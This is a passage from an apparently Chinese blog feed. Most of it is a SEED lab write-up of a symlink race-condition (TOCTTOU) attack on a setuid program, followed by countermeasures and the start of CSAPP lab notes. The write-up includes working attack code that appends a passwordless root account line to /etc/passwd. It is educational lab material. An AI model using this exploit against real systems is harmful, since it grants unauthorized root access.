å­—æ®µæ˜¯xï¼Œè¡¨ç¤ºå¯†ç å­˜å‚¨åœ¨å½±å­æ–‡ä»¶/etc/shadowä¸­ï¼Œéœ€è¦åœ¨å½±å­æ–‡ä»¶ä¸­æŸ¥æ‰¾ã€‚å¦‚æœç”¨çœŸå®å¯†ç æ›¿æ¢æ‰xï¼Œé‚£ä¹ˆå°±ä¼šç›´æ¥ä½¿ç”¨è¿™ä¸ªå¯†ç ï¼ˆhashå€¼ï¼‰ï¼Œè€Œä¸æ˜¯åœ¨å½±å­æ–‡ä»¶ä¸­æŸ¥æ‰¾</p><p>Ubuntuä¸­æœ‰ä¸€ä¸ªæ— å¯†ç è´¦æˆ·çš„é­”æ³•å€¼<code>U6aMy0wojraho </code>ï¼Œå¦‚æœæˆ‘ä»¬å°†æ­¤å€¼æ”¾åœ¨ç”¨æˆ·æ¡ç›®çš„å¯†ç å­—æ®µä¸­ï¼Œé‚£ä¹ˆåªéœ€åœ¨æç¤ºè¾“å…¥å¯†ç æ—¶æŒ‰ä¸€ä¸‹å›è½¦é”®å³å¯</p><p>å‘<code>/etc/passwd</code>æ–‡ä»¶æ·»åŠ å¦‚ä¸‹è®°å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ›å»ºä¸€ä¸ªå…·æœ‰ root ç‰¹æƒçš„æ–°ç”¨æˆ·å¸æˆ·ï¼Œä¸”ä¸éœ€è¾“å…¥å¯†ç ç›´æ¥å›è½¦å³å¯ï¼ŒéªŒè¯ç¡®å®å¦‚æ­¤</p><h1 id="Task-2-Launching-the-Race-Condition-Attack"><a href="#Task-2-Launching-the-Race-Condition-Attack" class="headerlink" title="Task 2: Launching the Race Condition Attack"></a>Task 2: Launching the Race Condition Attack</h1><h2 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="Task 2.A: Simulating a Slow Machine"></a>Task 2.A: Simulating a Slow Machine</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE* fp;<br><br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer);<br><br>    <span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>    sleep(<span class="hljs-number">10</span>);<br>        fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fp) &#123;<br>            perror(<span class="hljs-string">&quot;Open failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1</span>, fp);<br>        fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>        fclose(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸Šé¢ç¨‹åºä¸ºrootæ‰€æœ‰çš„4755æƒé™çš„å¯æ‰§è¡Œç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /dev/null /tmp/XYZ<br>[11/01/22]seed@VM:~/.../Labsetup$ a.out <br>test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br>[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /etc/passwd /tmp/XYZ<br></code></pre></td></tr></table></figure><p>æ”»å‡»æˆåŠŸï¼Œå¯ä»¥su testæ— å¯†ç ç™»å½•</p><h2 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="Task 2.B: The Real Attack"></a>Task 2.B: The Real Attack</h2><p>æ³¨é‡Šæ‰ä¸Šé¢ç¨‹åºçš„sleepè¯­å¥ï¼Œåœ¨ä¸€ä¸ªæ›´åŠ è´´åˆæ­£å¸¸æƒ…å¢ƒè¿›è¡Œæ”»å‡»</p><p>æœ‰ä¸‰ä¸ªç¨‹åºï¼š</p><ul><li>vulpã€‚è¢«æ³¨é‡Šæ‰sleepçš„setuidç¨‹åºï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æ”»å‡»çš„å¯¹è±¡</li><li>attackã€‚ä¸åœçš„æ›´æ”¹è½¯é“¾æ¥çš„æŒ‡å‘</li><li>target_process.shã€‚ä¸åœçš„æ‰§è¡Œvulpç¨‹åºï¼Œç›´åˆ°vulpæˆåŠŸè¢«æ”»å‡»ï¼Œä¹Ÿå³æ˜¯/etc/passwdæ–‡ä»¶ä¸­è¢«è¿½åŠ ä¸€è¡Œ<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>CHECK_FILE=&quot;ls -l /etc/passwd&quot;<br>old=$($CHECK_FILE)<br>new=$($CHECK_FILE)<br>while [ &quot;$old&quot; == &quot;$new&quot; ]  <br>do<br>   echo &quot;test:U6aMy0wojraho:0:0:test:/root:/bin/bash&quot; | ./vulp <br>   new=$($CHECK_FILE)<br>done<br>echo &quot;STOP... The passwd file has been changed&quot;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123; <br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <br>unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>usleep(<span class="hljs-number">100</span>); <br>unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>usleep(<span class="hljs-number">100</span>); <br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br></code></pre></td></tr></table></figure><p>/tmp/XYZæ¯ä¸€ç™¾æ¯«ç§’æ›´æ”¹ä¸€æ¬¡æŒ‡å‘ï¼Œåœ¨æŒ‡å‘/dev/nullå’Œ/etc/passwdä¹‹é—´å·¦å³æ¨ªè·³</p><p><img src="/image/Snipaste_2022-11-02_16-30-22.png"></p><p>åœ¨ä¸€ä¸ªshellä¸­è¿è¡Œtarget_process.shï¼Œå¦ä¸€ä¸ªshellä¸­è¿è¡Œattackï¼Œåœ¨å‡ ç§’å†…å³å¯æ”»å‡»æˆåŠŸï¼Œå‘ç°/etc/passwdä¸­è¿½åŠ äº†ä¸€è¡Œ<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash </code></p><h2 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="Task 2.C: An Improved Attack Method"></a>Task 2.C: An Improved Attack Method</h2><p>ä¸Šé¢çš„attack.cç¨‹åºå…·æœ‰ç«äº‰æ¡ä»¶æ¼æ´ï¼Œå› ä¸ºå½“accessä¹‹åï¼Œopenä¹‹å‰å¯èƒ½ä¼šunlinkä¸€ä¸‹ï¼Œç„¶åopenä¹‹å/tmp/xyzå°±ä¼šæˆä¸ºä¸€ä¸ªrootæ‰€æœ‰çš„ç¨‹åºï¼Œæ­¤åæ”»å‡»ç¨‹åºå°†æ— æ³•å†æ›´æ”¹/tmp/xyz</p><blockquote><p><code>/tmp</code> æ–‡ä»¶å¤¹æœ‰ä¸€ä¸ªâ€œç²˜æ€§â€ä½ï¼Œæ­¤ç›®å½•ä¸‹çš„æ–‡ä»¶çš„æ‰€æœ‰è€…æ‰èƒ½åˆ é™¤è¯¥æ–‡ä»¶</p></blockquote><p>æ”¹è‰¯åçš„attack.cï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags = RENAME_EXCHANGE;<br>    unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>    unlink(<span class="hljs-string">&quot;/tmp/ABC&quot;</span>); symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    renameat2(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>, flags);<br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>æ–°ç¨‹åºä½¿ç”¨renameat2ç³»ç»Ÿè°ƒç”¨è‡ªåŠ¨åˆ‡æ¢é“¾æ¥æŒ‡å‘ï¼Œè¿™å…è®¸æˆ‘ä»¬åœ¨ä¸å¼•å…¥ä»»ä½•ç«æ€æ¡ä»¶çš„æƒ…å†µä¸‹æ›´æ”¹/tmp/XYZ æŒ‡å‘çš„å†…å®¹</p><p>é‡å¤task2Bæ“ä½œï¼Œæ”»å‡»æˆåŠŸ</p><h1 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h1><h2 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3.A: Applying the Principle of Least Privilege"></a>Task 3.A: Applying the Principle of Least Privilege</h2><p>æœ€å°ç‰¹æƒåŸåˆ™ï¼šä½¿ç”¨ seteuid ç³»ç»Ÿè°ƒç”¨æš‚æ—¶ç¦ç”¨ root æƒé™ï¼Œç„¶ååœ¨å¿…è¦æ—¶å¯ç”¨å®ƒ</p><blockquote><p>åœ¨æ‰§è¡Œæ˜“å—æ”»å‡»çš„å‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬ç¦ç”¨ç‰¹æƒ; åœ¨æ˜“å—æ”»å‡»çš„å‡½æ•°è¿”å›ä¹‹åï¼Œæˆ‘ä»¬é‡æ–°å¯ç”¨è¯¥ç‰¹æƒ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">uid_t</span> uid = getuid(); <span class="hljs-comment">//çœŸå®ç”¨æˆ·id</span><br><span class="hljs-keyword">uid_t</span> euid = geteuid();<span class="hljs-comment">//æœ‰æ•ˆç”¨æˆ·idï¼Œå¦‚æœæ˜¯setuidç¨‹åºé‚£ä¹ˆä¼šå…·æœ‰rootæƒé™ </span><br>seteuid(uid); <br><br><span class="hljs-comment">/* æ‰§è¡Œä¸éœ€è¦rootç‰¹æƒçš„æ“ä½œ */</span><br><br>seteuid(euid); <br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Task-3-B-Using-Ubuntuâ€™s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntuâ€™s-Built-in-Scheme" class="headerlink" title="Task 3.B: Using Ubuntuâ€™s Built-in Scheme"></a>Task 3.B: Using Ubuntuâ€™s Built-in Scheme</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">// On Ubuntu 16.04 and 20.04, use the following command:<br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=1</span><br>// On Ubuntu 12.04, use the following command:<br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w kernel.yama.protected_sticky_symlinks=1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab</title>
    <link href="/p/d4c22a8b/"/>
    <url>/p/d4c22a8b/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/csapp1.png"></p><p><strong>å­¦ CSAPP ä¸åšå®éªŒï¼Œå°±åƒå››å¤§åè‘—ä¸çœ‹çº¢æ¥¼æ¢¦ï¼Œè¯´æ˜è¿™ä¸ªäººæ–‡å­¦é€ è¯£å’Œè‡ªæˆ‘ä¿®å…»ä¸è¶³ï¼Œä»–ç†è§£ä¸äº†è¿™ç§å†…åœ¨çš„é˜³æ˜¥ç™½é›ªçš„é«˜é›…è‰ºæœ¯ï¼Œä»–åªèƒ½çœ‹åˆ°å¤–è¡¨çš„è¾è—»å †ç Œï¼Œå‚ä¸é€å…¶ä¸­æ·±å¥¥çš„ç²¾ç¥å†…æ ¸ï¼Œä»–æ•´ä¸ªäººçš„å±‚æ¬¡å°±å¡åœ¨è¿™é‡Œäº†ï¼Œåªèƒ½åº¦è¿‡ä¸€ä¸ªç›¸å¯¹å¤±è´¥çš„äººç”Ÿã€‚</strong></p><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><ul><li><p><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-s22/www/schedule.html">csapp è¯¾ç¨‹ç½‘ç«™</a></p></li><li><p><a href="https://csapp.cs.cmu.edu/3e/students.html">CS:APP3e Student Site</a></p></li><li><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">lab ä¸»é¡µ</a></p></li></ul><p>åœ¨ä¸»é¡µè·å–åˆ°handoutåï¼Œè§£å‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tar</span> xvf cprogramminglab-handout.tar <br></code></pre></td></tr></table></figure><h1 id="è¿›åº¦"><a href="#è¿›åº¦" class="headerlink" title="è¿›åº¦"></a>è¿›åº¦</h1><ul><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/3b50ff2c/">CSAPP-lab0ï¼šC Programming Lab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/6d79108/">CSAPP-lab1ï¼šData lab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/44962f68/">CSAPP-lab2ï¼šBomb-lab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://gls.show/p/db3828d1/">CSAPP-lab3ï¼šbuflab</a></li><li><input checked="" disabled="" type="checkbox"> <a href="">CSAPP-lab4ï¼šshell lab</a></li></ul><h1 id="lab0"><a href="#lab0" class="headerlink" title="lab0"></a>lab0</h1><p><a href="https://gls.show/p/3b50ff2c/">CSAPP-lab0ï¼šC Programming Lab</a></p><h1 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h1><p><a href="https://gls.show/p/6d79108/">CSAPP-lab1ï¼šData lab</a></p><h1 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h1><p><a href="https://gls.show/p/44962f68/">CSAPP-lab2ï¼šBomb-lab</a></p><h1 id="lab3"><a href="#lab3" class="headerlink" title="lab3"></a>lab3</h1><p><a href="https://gls.show/p/db3828d1/">CSAPP-lab3ï¼šbuflab</a></p><h1 id="lab4"><a href="#lab4" class="headerlink" title="lab4"></a>lab4</h1><p><a href="">CSAPP-lab4ï¼šshell lab</a></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-labï¼šshell lab</title>
    <link href="/p/219af9ac/"/>
    <url>/p/219af9ac/</url>
    
    <content type="html"><![CDATA[<h1 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h1><p>æ­¤æ¬¡å®éªŒçš„ç›®çš„æ˜¯åšä¸€ä¸ªtiny shellï¼Œ<strong>å®ç°çš„tshæœ‰ä»¥ä¸‹è¦æ±‚ï¼š</strong></p><ul><li>æç¤ºç¬¦åº”è¯¥æ˜¯å­—ç¬¦ä¸²â€œ tsh &gt;â€</li><li>ç”¨æˆ·é”®å…¥çš„å‘½ä»¤è¡Œåº”è¯¥ç”±ä¸€ä¸ªåç§°å’Œé›¶ä¸ªæˆ–å¤šä¸ªå‚æ•°ç»„æˆï¼Œæ‰€æœ‰è¿™äº›å‚æ•°éƒ½ç”±ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼éš”å¼€ã€‚å¦‚æœ name æ˜¯ä¸€ä¸ªå†…ç½®å‘½ä»¤ï¼Œé‚£ä¹ˆ tsh åº”è¯¥ç«‹å³å¤„ç†å®ƒå¹¶ç­‰å¾…ä¸‹ä¸€ä¸ªå‘½ä»¤è¡Œã€‚å¦åˆ™ï¼Œtsh åº”è¯¥å‡å®š name æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œå®ƒåœ¨åˆå§‹å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­åŠ è½½å’Œè¿è¡Œè¯¥æ–‡ä»¶(åœ¨æ­¤ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ¯è¯­ job æŒ‡çš„æ˜¯è¿™ä¸ªåˆå§‹å­è¿›ç¨‹)</li><li>tsh ä¸éœ€è¦æ”¯æŒç®¡é“(|)æˆ– I/O é‡å®šå‘(&lt; å’Œ &gt;)</li><li>é”®å…¥ ctrl-c (ctrl-z)ä¼šå¯¼è‡´ SIGINT (SIGTSTP)ä¿¡å·è¢«å‘é€åˆ°å½“å‰çš„å‰å°ä½œä¸šï¼Œä»¥åŠè¯¥ä½œä¸šçš„ä»»ä½•å­è¿›ç¨‹(ä¾‹å¦‚ï¼Œå®ƒforkçš„ä»»ä½•å­è¿›ç¨‹)ã€‚å¦‚æœæ²¡æœ‰å‰å°ä½œä¸šï¼Œé‚£ä¹ˆä¿¡å·åº”è¯¥æ²¡æœ‰æ•ˆæœ</li><li>å¦‚æœå‘½ä»¤è¡Œä»¥ &amp; ç»“å°¾ï¼Œé‚£ä¹ˆ tsh åº”è¯¥åœ¨åå°è¿è¡Œä½œä¸šã€‚å¦åˆ™ï¼Œå®ƒåº”è¯¥åœ¨å‰å°è¿è¡Œä½œä¸š</li><li>æ¯ä¸ªä½œä¸šå¯ä»¥é€šè¿‡è¿›ç¨‹ ID (PID)æˆ–ä½œä¸š ID (JID)æ¥æ ‡è¯†ï¼ŒJID æ˜¯ç”± tsh åˆ†é…çš„æ­£æ•´æ•°ã€‚JID åº”è¯¥åœ¨å‘½ä»¤è¡Œä¸­ç”¨å‰ç¼€â€œ%â€è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œâ€œ% 5â€è¡¨ç¤º JID5ï¼Œè€Œâ€œ5â€è¡¨ç¤º PID 5</li><li>tsh åº”è¯¥æ”¯æŒä»¥ä¸‹å†…ç½®å‘½ä»¤<ul><li>quit ç»ˆæ­¢shell</li><li>jobs åˆ—å‡ºæ‰€æœ‰åå°ä»»åŠ¡</li><li>bg &lt; job &gt; å‘½ä»¤é‡å¯ &lt; job &gt; ï¼Œå‘é€ä¸€ä¸ª SIGCONT ä¿¡å·ï¼Œç„¶ååœ¨<strong>åå°</strong>è¿è¡Œå®ƒã€‚&lt; job &gt; å‚æ•°å¯ä»¥æ˜¯ PID æˆ– JID</li><li>fg &lt; job &gt; å‘½ä»¤é‡å¯ &lt; job &gt; ï¼Œå‘é€ä¸€ä¸ª SIGCONT ä¿¡å· ï¼Œç„¶ååœ¨<strong>å‰å°</strong>è¿è¡Œå®ƒã€‚&lt; job &gt; å‚æ•°å¯ä»¥æ˜¯ PID æˆ– JID</li></ul></li><li>tsh åº”è¯¥reapå®ƒæ‰€æœ‰çš„åƒµå°¸å­è¿›ç¨‹ã€‚å¦‚æœä»»ä½•ä½œä¸šå› ä¸ºæ¥æ”¶åˆ°æœªæ•è·çš„ä¿¡å·è€Œç»ˆæ­¢ï¼Œé‚£ä¹ˆ tsh åº”è¯¥è¯†åˆ«æ­¤äº‹ä»¶ï¼Œå¹¶ä½¿ç”¨ä½œä¸šçš„ PID å’Œè¿è§„ä¿¡å·çš„æè¿°æ‰“å°æ¶ˆæ¯</li></ul><p>æ¯æ¬¡ä¿®æ”¹ tsh.c æ–‡ä»¶æ—¶ï¼Œé”®å…¥ make ä»¥é‡æ–°ç¼–è¯‘</p><p>è¦è¿è¡Œ shellï¼Œéœ€è¦åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥ ./tsh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">unix&gt;</span><span class="bash"> ./tsh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">tsh&gt;</span><span class="bash"> [<span class="hljs-built_in">type</span> commands to your shell here]</span><br></code></pre></td></tr></table></figure><p>å…³äºshellï¼š</p><ul><li><p>å‘½ä»¤è¡Œæ˜¯ç”±ç©ºæ ¼åˆ†éš”çš„ ASCII æ–‡æœ¬å•è¯åºåˆ—ã€‚å‘½ä»¤è¡Œä¸­çš„ç¬¬ä¸€ä¸ªå•è¯æ˜¯å†…ç½®å‘½ä»¤çš„åç§°æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„åã€‚å…¶ä½™çš„å•è¯æ˜¯å‘½ä»¤è¡Œå‚æ•°ã€‚å¦‚æœç¬¬ä¸€ä¸ªå•è¯æ˜¯å†…ç½®å‘½ä»¤ï¼Œåˆ™ shell å°†ç«‹å³åœ¨å½“å‰è¿›ç¨‹ä¸­æ‰§è¡Œè¯¥å‘½ä»¤ã€‚å¦åˆ™ï¼Œè¯¥å•è¯è¢«å‡å®šä¸ºå¯æ‰§è¡Œç¨‹åºçš„è·¯å¾„åã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œshell åˆ†æ”¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶ååœ¨å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­åŠ è½½å¹¶è¿è¡Œç¨‹åºã€‚ç”±äºè§£é‡Šå•ä¸ªå‘½ä»¤è¡Œè€Œåˆ›å»ºçš„å­è¿›ç¨‹ç»Ÿç§°ä¸ºä½œä¸šã€‚é€šå¸¸ï¼Œä¸€ä¸ªä½œä¸šå¯ä»¥ç”±å¤šä¸ªå­è¿›ç¨‹ç»„æˆï¼Œè¿™äº›å­è¿›ç¨‹ç”± Unix ç®¡é“è¿æ¥ã€‚</p></li><li><p>å¦‚æœå‘½ä»¤è¡Œä»¥â€œ &amp;â€ç»“å°¾ï¼Œé‚£ä¹ˆä½œä¸šå°†åœ¨åå°è¿è¡Œï¼Œè¿™æ„å‘³ç€ shell åœ¨æ‰“å°æç¤ºç¬¦å¹¶ç­‰å¾…ä¸‹ä¸€ä¸ªå‘½ä»¤è¡Œä¹‹å‰ä¸ä¼šç­‰å¾…ä½œä¸šç»ˆæ­¢ã€‚å¦åˆ™ï¼Œä½œä¸šå°†åœ¨å‰å°è¿è¡Œï¼Œè¿™æ„å‘³ç€ shell åœ¨ç­‰å¾…ä¸‹ä¸€ä¸ªå‘½ä»¤è¡Œä¹‹å‰ç­‰å¾…ä½œä¸šç»ˆæ­¢ã€‚å› æ­¤ï¼Œåœ¨ä»»ä½•æ—¶å€™ï¼Œæœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªä½œä¸šåœ¨å‰å°è¿è¡Œã€‚ä½†æ˜¯ï¼Œä»»æ„æ•°é‡çš„ä½œä¸šéƒ½å¯ä»¥åœ¨åå°è¿è¡Œã€‚ä¾‹å¦‚ï¼Œé”®å…¥å‘½ä»¤è¡Œ</p></li><li><p>Unix shell æ”¯æŒä½œä¸šæ§åˆ¶çš„æ¦‚å¿µï¼Œå…è®¸ç”¨æˆ·åœ¨åå°å’Œå‰å°ä¹‹é—´æ¥å›ç§»åŠ¨ä½œä¸šï¼Œå¹¶æ›´æ”¹ä½œä¸šä¸­è¿›ç¨‹çš„è¿›ç¨‹çŠ¶æ€(è¿è¡Œã€åœæ­¢æˆ–ç»ˆæ­¢)ã€‚é”®å…¥ ctrl-c ä¼šå°† SIGINT ä¿¡å·ä¼ é€’ç»™å‰å°ä½œä¸šä¸­çš„æ¯ä¸ªè¿›ç¨‹ã€‚SIGINT çš„é»˜è®¤æ“ä½œæ˜¯ç»ˆæ­¢è¿›ç¨‹ã€‚ç±»ä¼¼åœ°ï¼Œé”®å…¥ ctrl-z å°†å¯¼è‡´ SIGTSTP ä¿¡å·ä¼ é€’åˆ°å‰å°ä½œä¸šä¸­çš„æ¯ä¸ªè¿›ç¨‹ã€‚SIGTSTP 